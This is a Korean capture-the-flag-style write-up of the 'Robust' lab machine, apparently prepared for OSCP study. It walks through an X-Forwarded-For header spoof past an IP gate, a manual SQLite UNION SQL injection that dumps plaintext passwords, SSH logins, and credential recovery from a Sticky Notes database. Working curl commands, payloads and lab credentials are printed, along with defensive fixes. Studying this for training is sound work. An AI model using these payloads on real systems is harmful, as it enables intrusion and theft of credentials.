---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/solved
  - tech/web/access-control-bypass
  - tech/web/sqli
  - tech/db/sqlite
  - tech/creds/reuse
  - tech/windows/sticky-notes
type: machine
platform: pg
os: windows
status: solved
manual_tags: true
manual_cves: true
---
# Robust

> [!info] 상단 요약
> 타겟 `192.168.248.200` · Windows 10 20H2 (빌드 10.0.19042.1586) · 난이도 Fundamental · 플래그 2개
> `X-Forwarded-For: 10.10.10.1` 로 403 IP 게이트 우회 → `home.php` 검색 파라미터에 **SQLite UNION SQLi** → `employees` 테이블에서 `Jeff:Mathsisfun123` 회수 → SSH 로 user → **Sticky Notes DB(`plum.sqlite`)** 에 평문 저장된 `Administrator:MySupersecurePassword2112` → SSH 로 root.

## 0. 이 박스에서 배우는 것

- **헤더 기반 IP 접근제어 우회** — 앱이 신뢰하는 헤더(`X-Forwarded-For`)를 클라이언트가 그대로 위조. 유한한 후보 헤더 집합을 배치로 쏴 «어느 하나»가 통하는지 가림.
- **수동 UNION SQLi 전 과정** — 컬럼 수 판별 → 출력 위치 확인 → **DB 엔진 지문** → 스키마 열거 → 자격증명 덤프. sqlmap 없이 손으로.
- **DB 엔진이 MySQL 이 아닐 수 있다** — `version()`·`information_schema` 가 «빈 결과»를 내면 실패가 아니라 **엔진 오판** 신호. 여기선 SQLite(`sqlite_master`·`sqlite_version()`).
- **Windows Sticky Notes 는 자격증명 저장소다** — `plum.sqlite` 는 노트 본문을 **평문**으로 담음. user→root 피벗의 흔한 형태.
- **시험 출제 가능성**: XFF 우회 + 수동 SQLi 조합은 웹 초급 박스의 정석. Sticky Notes 자격증명 회수는 Windows 로컬 피벗으로 반복 등장.

## 1. 정찰

### Nmap

top-1000 은 2포트뿐. `-p-` 에서 7680/tcp 가 하나 더 잡혔으나 Windows Delivery Optimization(업데이트 P2P 배포)의 고정 포트라 공격면 아님. UDP top-100 은 전부 무응답.

출처: `~/PG/Robust/nmap-quick.txt`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH for_Windows_8.1 (protocol 2.0)
80/tcp open  http    PHP cli server 5.5 or later (PHP 7.3.33)
|_Requested resource was login.php
```

`OpenSSH for_Windows` 배너로 **Windows 확정**. 80 은 PHP 내장 서버(`php -S`)이지 Apache/IIS 아님 — `.htaccess`·모듈 기반 우회는 애초에 대상 아님.

### 웹 진입점 — 403 IP 게이트

`/` → 302 `login.php`. `login.php` 본문:

```
Your IP is not allowed to use this webservice. Only 10.10.10.x is allowed
```

![[PG-Robust-403.png]]

IP 기반 화이트리스트. 실제 소켓 IP(192.168.45.x)는 못 바꾸므로 앱이 IP 를 **어디서 읽는가**가 관건 — 헤더를 신뢰하면 위조 가능.

## 2. 취약점 분석

### 2-1. X-Forwarded-For 접근제어 우회

> [!note] 배경 — 프록시 뒤 실 IP 헤더
> 리버스 프록시(nginx·CloudFlare 등) 뒤에 있는 앱은 `$_SERVER['REMOTE_ADDR']` 이 프록시 IP 로 고정되므로, 원 클라이언트 IP 를 `X-Forwarded-For` 같은 헤더로 전달받아 읽음. 앱이 이 헤더를 **접근제어 판단에 직접** 쓰면, 프록시가 없는 직결 환경에서도 클라이언트가 헤더를 위조해 임의 IP 를 사칭.

후보 헤더 12종을 배치로 쏘고 응답 크기로 diff. 통한 것은 **`X-Forwarded-For` 하나뿐**.

출처: `~/PG/Robust/xff/` (12개 응답 본문 전량 보존)

```
200 1770 X-Forwarded-For       ← 로그인 폼 노출 (게이트 통과)
200 90   X-Real-IP             ← "not allowed" (90B)
200 90   X-Originating-IP
200 90   X-Client-IP
200 90   Client-IP
200 90   X-Forwarded-Host
... (나머지 전부 90B "not allowed")
```

```sh
curl -s -H "X-Forwarded-For: 10.10.10.1" http://192.168.248.200/login.php
```

`10.10.10.x` 대역 임의 값이면 통과. 이후 «모든» 요청에 이 헤더를 붙여야 함.

![[PG-Robust-login.png]]

### 2-2. home.php — 인증 우회 없이 도달하는 검색 기능

게이트 통과 후 엔드포인트를 배치 프로빙. `home.php` 가 특이:

출처: `~/PG/Robust/probe2/`

```
302 3030  /home.php     ← 302 인데 본문 3030B (리다이렉트 후에도 페이지 전량 렌더)
302 0     /index.php
404 ...   기타
```

`home.php` 는 `Location:` 헤더로 302 를 보내면서도 `exit`/`die` 없이 **페이지 전체를 출력**. 즉 리다이렉트를 «따라가지 않으면»(`curl` 기본 동작) 인증 뒤 화면을 그대로 읽음. `Manage Employees` 직원 검색 폼 + 목록.

![[PG-Robust-home.png]]

검색 폼: `?action=search&first_name=<입력>&last_name=<입력>` (GET). 이 파라미터가 SQL 에 그대로 들어감.

### 2-3. SQLite UNION SQL Injection

> [!note] 왜 「UNION」인가
> 검색 결과가 화면 표에 직접 렌더됨(in-band). 이럴 때 `UNION SELECT` 로 원 쿼리 결과에 임의 SELECT 를 이어붙이면, 그 결과가 같은 표에 나옴 — blind 추출(참/거짓·시간)보다 훨씬 빠름.

## 3. Foothold — 수동 UNION 전 과정

모든 요청에 `-H "X-Forwarded-For: 10.10.10.1"` 필수. 파라미터는 `--data-urlencode` 로 인코딩(`'`·공백·`--` 보존).

### 3-1. 주입점 확인

`first_name=Desireef'` → 결과 0행(쿼리 깨짐). `first_name=Desireef' -- ` → 1행 복귀. 작은따옴표 문자열 컨텍스트 확정.

출처: `~/PG/Robust/union/`

### 3-2. 컬럼 수 — ORDER BY / UNION NULL 병행

NULL 개수 1~6, `ORDER BY` 1/5/10 을 각각 한 배치로. 출처: `~/PG/Robust/union/c7~c15.body`

```
' UNION SELECT NULL--                     → 0행
' UNION SELECT NULL,NULL--                → 0행
' UNION SELECT NULL,NULL,NULL--           → 0행
' UNION SELECT NULL,NULL,NULL,NULL--      → 정상 (표에 빈 행 추가)
' UNION SELECT NULL,NULL,NULL,NULL,NULL-- → 0행 (컬럼 불일치로 쿼리 실패)
' ORDER BY 1--                            → 정상
' ORDER BY 5--                            → 0행
' ORDER BY 10--                           → 0행
```

**컬럼 4개** 확정. `ORDER BY 5` 실패 + `UNION SELECT` 4-NULL 성공, 두 방법이 일치.
판정은 응답 본문 크기로 함 — 오류 메시지가 안 뜨므로 「행이 렌더됐는가」가 유일한 신호. 실패 응답은 약 1.87KB(빈 표), 성공은 4.3KB.

### 3-3. DB 엔진 지문 — 여기서 헛짚었다

첫 시도 `' UNION SELECT 1,version(),database(),user()-- ` → **0행**. MySQL 함수가 통째로 실패.
엔진 판별 배치를 쏨:

출처: `~/PG/Robust/fp/`

```
' UNION SELECT 1,2,3,4--                            → 정상 (11행: 원본10 + 주입1 `1 2 3 4`)
' UNION SELECT 1,sqlite_version(),3,4--             → 정상, 2번 자리에 `3.28.0` ← SQLite 확정
' UNION SELECT 1,@@version,3,4--                    → 0행 (MySQL/MSSQL 함수 실패)
' UNION SELECT 1,version(),3,4--                    → 0행
' UNION SELECT 1,name,sql,4 FROM sqlite_master--     → 정상 (스키마 노출)
' UNION SELECT 1,table_name,3,4 FROM information_schema.tables-- → 0행
```

`sqlite_version()` 만 통하고 값이 `3.28.0` → **SQLite**. `information_schema` 는 SQLite 에 아예 없으므로 앞서 던진 tables 쿼리가 빈 결과였던 것.
주입 행의 네 값(`1 2 3 4`)이 표의 `Id`·`First name`·`Last name`·`Birth date` 열에 **그대로 하나씩** 렌더됨 — 즉 출력 가능한 자리는 4개 전부.

### 3-4. 스키마 열거 — sqlite_master

```
' UNION SELECT 1,name,sql,4 FROM sqlite_master-- 
```

돌아온 테이블 7개 — `class_lists` · `employees` · `emps` · `qualifications` · `sqlite_sequence` · `staffing_plan` · `terms`.
`sqlite_sequence` 가 목록에 있는 것 자체가 SQLite 확증(AUTOINCREMENT 내부 테이블).

화면에 보이던 직원 목록은 `emps`(생년월일·주소 등)이고, `password` 컬럼을 가진 것은 **별개 테이블 `employees`**:

```
CREATE TABLE "employees" ( "id" INTEGER, "first_name" TEXT, "last_name" TEXT, "password" TEXT, PRIMARY KEY("id" AUTOINCREMENT) )
```

이름이 비슷한 두 테이블을 헷갈리면 덤프 대상을 잘못 잡음. 나머지는 학사·인사 관리용 테이블이고 `sqlite_sequence` 는 SQLite 내부 테이블 — 덤프해 보지 않았음.

### 3-5. 자격증명 덤프

```sh
curl -s -H "X-Forwarded-For: 10.10.10.1" -G \
  --data-urlencode 'action=search' \
  --data-urlencode "first_name=' UNION SELECT id,first_name,last_name,password FROM employees-- " \
  --data-urlencode 'last_name=' \
  http://192.168.248.200/home.php
```

`password` 는 4번째 선택 컬럼이므로 표의 **`Birth date` 열**에 렌더됨(출처: `~/PG/Robust/union/creds.body`):

```
Id | First name | Last name | Birth date
1  | Jeff       | Hills     | Mathsisfun123
```

![[PG-Robust-sqli.png]]

`employees` 테이블은 단 1행. 평문 비밀번호 `Mathsisfun123`.

### 3-6. SSH 로 user

앱 로그인 폼에 `Jeff/Mathsisfun123` 은 **안 통함** — `Invalid user or password.` 가 뜸(`~/PG/Robust/applogin.body`). 앱 로그인이 어느 저장소를 참조하는지는 **관측 없음** — 확인된 것은 `employees.password` 값이 앱 폼에서 거부됐다는 것까지임. 그러나 OS 계정으로는 그대로 재사용됨:

```sh
sshpass -p 'Mathsisfun123' ssh jeff@192.168.248.200
```

대화형 pty 프롬프트(출처: `~/PG/Robust/pty_jeff.txt`):

```
Microsoft Windows [Version 10.0.19042.1586]
(c) Microsoft Corporation. All rights reserved.

jeff@ROBUST C:\Users\Jeff>whoami && hostname && type C:\Users\jeff\Desktop\local.txt
robust\jeff
ROBUST
c73e61a25344e60d7e3d9fab6711200a
```

## 4. 권한상승 — Sticky Notes 평문 자격증명

### 4-1. 열거로 무엇을 발견했는가

`harvest.ps1` 실행. 이 계정은 권한이 낮아 상당수 항목이 접근거부:

출처: `~/PG/Robust/harvest.txt` · `harvest-gap-check.txt`

- `whoami /all` — 특권은 `SeShutdown`·`SeChangeNotify`·`SeUndock`·`SeIncreaseWorkingSet`·`SeTimeZone` 5개뿐. `SeImpersonatePrivilege` **없음** → Potato 계열 불가. Medium IL, 그룹은 `BUILTIN\Users` 외에 특권 없음.
- `systeminfo` → `ERROR: Access denied` (hotfix 목록으로 커널 익스플로잇을 고르는 경로가 통째로 막힘)
- `Get-CimInstance Win32_Service` → count 0 / `Get-ScheduledTask` → **CIM 서버 접근거부**. 서비스 바이너리 권한·언쿼티드 경로 점검이 전부 공란
- Winlogon AutoLogon·AlwaysInstallElevated → 빈 값 / `cmdkey /list` → `* NONE *` / PowerShell 히스토리 없음
- `icacls C:\Windows\System32\config\SAM` → `Access is denied` — SeriousSAM(CVE-2021-36934) 아님
- 로컬 admin 그룹 = `Administrator` 뿐. 계정은 `Administrator`·`Jeff`·`Guest`·`DefaultAccount`·`WDAGUtilityAccount`
- `netstat -ano` — 내부에는 135·139·445·5040·7680 이 LISTEN. 외부 nmap 에는 안 잡히므로 호스트 방화벽이 SMB/RPC 를 막고 있음. 즉 **네트워크 쪽으로 더 팔 것이 없음**

즉 커널·서비스·토큰·SMB 경로가 전부 막힘. 남는 것은 **파일에 남은 자격증명**.

### 4-2. Sticky Notes DB

경로는 Sticky Notes 앱의 고정 위치:

```
C:\Users\jeff\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
```

디렉터리 열거 결과 `plum.sqlite` · `plum.sqlite-wal` · `plum.sqlite-shm` 세 파일이 존재(`~/PG/Robust/sticky-find.txt`). scp 로 **본 DB 만** 회수해 `sqlite3` 로 열람 — 본 DB 에서 바로 평문이 나와 `-wal`·`-shm` 은 받지 않음.

출처: `~/PG/Robust/sticky/plum.sqlite`

```sh
sqlite3 sticky/plum.sqlite 'select * from Note;'
```

`Note` 테이블 2행, 본문이 **평문**:

```
\id=0d4b8d2c-8539-4fb4-8c8b-184552bf9b92 Credentials:
\id=a6c52b67-f266-45ff-9aaf-5ccbe22f7d45 Administrator:MySupersecurePassword2112|ManagedPosition=|0|0||Yellow|0|...
```

> [!note] 왜 sqlite3 로 여는가
> Sticky Notes 는 각 노트를 SQLite `Note` 테이블에 그대로 저장. `strings plum.sqlite` 로도 보이지만 `sqlite3 'select * from Note'` 가 행 구조를 살려 정확.
> **`-wal` 이 있으면 같이 받아라** — WAL 모드에서는 최신 변경이 본 DB 에 체크포인트되기 전까지 `-wal` 에만 있어서, 본 DB 만 열면 최신 노트를 통째로 놓칠 수 있음. 이 박스는 본 DB 에 이미 있었을 뿐임.

### 4-3. root

```sh
sshpass -p 'MySupersecurePassword2112' ssh Administrator@192.168.248.200
```

대화형 pty(출처: `~/PG/Robust/pty_admin.txt`):

```
Microsoft Windows [Version 10.0.19042.1586]
(c) Microsoft Corporation. All rights reserved.

administrator@ROBUST C:\Users\Administrator>whoami && hostname && type C:\Users\Administrator\Desktop\proof.txt
robust\administrator
ROBUST
d2cdab936a61a5e7a0abd203cd8f4670
```

## 5. 플래그

| | 위치 | 값 |
|---|---|---|
| user | `C:\Users\jeff\Desktop\local.txt` | `c73e61a25344e60d7e3d9fab6711200a` |
| root | `C:\Users\Administrator\Desktop\proof.txt` | `d2cdab936a61a5e7a0abd203cd8f4670` |

증거: `~/PG/Robust/proof_user.txt` · `proof_root.txt`(각각 `whoami /all`+`hostname`+`ipconfig`+`type` 한 화면). pty 프롬프트: `pty_jeff.txt`·`pty_admin.txt`.

## 6. 막혔던 지점 / 시행착오

- **DB 엔진 오판(가장 큰 헛짚음)** — MySQL 가정으로 `version()`·`database()`·`user()`·`information_schema.tables` 를 먼저 던졌고 전부 **0행**. 「빈 결과 = 주입 실패」로 오독할 뻔했으나, 앞서 `UNION SELECT NULL,NULL,NULL,NULL` 은 정상이었으므로 «주입은 되는데 함수만 실패» = **엔진 불일치**로 판단. `sqlite_version()` 한 방으로 SQLite 확정. 교훈: **주입 가능(구조) ≠ 함수 호환(엔진).** 컬럼 수부터 확정한 뒤 엔진 지문을 따로 찍어라.
- **home.php 의 302 함정** — `curl -L`(리다이렉트 따라감)로 봤으면 `login.php` 로 튕겨 빈손. `home.php` 는 302 를 보내면서도 본문을 전량 출력하므로 **리다이렉트를 따라가지 않아야** 보임. 배치 프로빙에서 「302인데 body 3030B」를 놓치지 않은 게 진입점이 됨.
- **gobuster 가 시작하자마자 죽는다** — 확장자 없는 경로(`/README`·`/admin/` 등)가 전부 302 를 돌려주는 사이트라, 기본값(`-b 404,403`)으로 돌리면 와일드카드 판정에 걸려 결과 파일이 **0바이트**로 끝남. `-b 302,404` 로 재실행해야 진짜 히트(`/login.php`·`/ip.php`)가 나옴. 도구 문제가 아니라 대상 특성이니 **결과가 비면 blacklist 부터 의심할 것.** 다만 `/home.php` 는 302 라서 이 재실행에서도 안 잡힘 — 디렉터리 버스팅만 믿으면 진입점을 놓친다.
- **앱 로그인 폼은 미끼** — `login.php` 는 SQLi 안 통함. 16종 페이로드(오류기반 10 + 시간기반 6) 응답이 **전부 바이트 단위로 동일**했고, 그 본문은 나중에 정상 자격증명으로 로그인했을 때와도 같은 1838B(`Invalid user or password.` 포함). 시간기반 6종은 응답 코드·크기만 기록했고 **응답 지연 시간은 측정해 두지 않음** — 「시간 지연이 없었다」고는 말 못 하고, 본문이 같았다는 것까지가 관측. 실제 주입점은 `home.php` 검색 파라미터. 로그인 폼에 시간을 안 태운 게 중요.
- **회수한 자격증명 ≠ 앱 로그인** — `Jeff/Mathsisfun123` 을 앱 폼에 넣으면 `Invalid user or password`. 「이 비번은 앱용이 아니라 OS 용」으로 판단해 SSH 로 전환. **자격증명은 발견한 맥락과 다른 서비스에서 통할 수 있다.**
- **권한상승 경로 소거** — jeff 는 `SeImpersonate` 없음·CIM 접근거부·systeminfo 거부로 커널/서비스/토큰 경로가 전부 막힘. 그래서 「파일에 남은 크리덴셜」로 방향 전환 → Sticky Notes. 막다른 길을 빨리 확인한 게 시간 절약.

## 7. OSCP 시험 관점

- **셸(SSH) 잡자마자 칠 것**: `whoami /all`(권한·IL 확인) · `net user`/`net localgroup administrators` · `systeminfo`(hotfix) · Sticky Notes/브라우저/`cmdkey`/Winlogon 자격증명 스윕.
- **XFF 게이트를 만나면**: 접근제어가 헤더 기반인지부터 의심. 후보 헤더(`X-Forwarded-For`·`X-Real-IP`·`X-Client-IP`·`True-Client-IP`·`X-Originating-IP`·`Forwarded`)를 **한 번에 배치로**. 통하는 것은 대개 하나.
- **수동 SQLi 절차(sqlmap 금지 대비)**: ① `'` 로 주입 확인 → ② `ORDER BY n` / `UNION SELECT NULL×n` 로 컬럼 수 → ③ 상수(`1,2,3,4`)로 출력 위치 → ④ **엔진 지문**(`sqlite_version()`/`@@version`/`version()`) → ⑤ 스키마(`sqlite_master` 또는 `information_schema`) → ⑥ 덤프.
- **엔진 지문 치트**: `information_schema` 없음 + `sqlite_version()` 통함 = SQLite. `@@version` = MySQL/MSSQL. `version()` = MySQL/PostgreSQL. 스키마 뷰: SQLite→`sqlite_master`, MySQL/PG/MSSQL→`information_schema`.
- **시간 배분**: 웹 초급 박스. 게이트 우회~덤프 15분 내, Sticky Notes 피벗 5분. 로그인 폼 SQLi 에 매달리지 말 것 — 그건 미끼.
- **리버스셸 미사용** — SSH 자격증명 경로라 아웃바운드 포트 문제 자체가 없었음.

## 8. 방어 관점

- 접근제어를 `X-Forwarded-For` 같은 **클라이언트 제어 헤더**로 판단 금지. 실제 소켓 IP(`REMOTE_ADDR`)나 프록시가 신뢰 서명한 값만 사용.
- 검색 파라미터를 **파라미터화 쿼리(prepared statement)** 로 바인딩. 문자열 연결 금지.
- 자격증명을 앱 DB 에 **평문 저장** 금지 — 해시(bcrypt/argon2). Sticky Notes 같은 사용자 앱에 비밀번호를 적어두지 말 것.
- `home.php` 인증 리다이렉트 뒤 반드시 `exit` — 302 후에도 본문을 렌더하는 것 자체가 인증 우회.

## 9. 참고 자료

- SQLite `sqlite_master` 스키마 열거: <https://www.sqlite.org/schematab.html>
- PayloadsAllTheThings — HTTP header IP spoofing / SQLi UNION
- Sticky Notes `plum.sqlite` 포렌식: `%LOCALAPPDATA%\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\`

## 남긴 흔적 / 관련 노트

- 타겟 업로드 `h.ps1`·`harvest.txt`·`rbchk.ps1` 전부 삭제 확인(`~/PG/Robust/cleanup.txt`).
- 계정 생성·설정 변경 없음. `plum.sqlite*` 는 읽기(scp)만.
- Kali 리스너 없음(SSH 경로). tmux 세션 전부 이름으로 종료. NFS 마운트 없음.
- 관련: 헤더 위조 접근우회·수동 UNION SQLi 패턴.
